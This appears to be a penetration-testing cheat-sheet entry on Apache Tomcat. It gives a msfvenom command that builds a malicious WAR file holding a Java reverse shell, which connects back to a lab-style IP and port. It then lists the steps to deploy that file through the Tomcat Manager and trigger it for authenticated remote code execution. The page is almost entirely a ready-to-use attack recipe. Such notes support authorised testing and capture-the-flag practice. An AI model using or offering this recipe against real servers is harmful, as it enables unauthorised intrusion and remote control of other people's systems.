---
title: "Apache Tomcat"
date: 2024-7-2
tags: ["tomcat", "apache", "web server", "war", "java"]
---

---
### RCE (Authenicated)

```bash
# Create a malicious WAR file
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war

# 1. Login to Tomcat Web Application Manager
# 2. WAR file to deploy -> Deploy
# 3. Click /revshell in Applications table
```

<br>
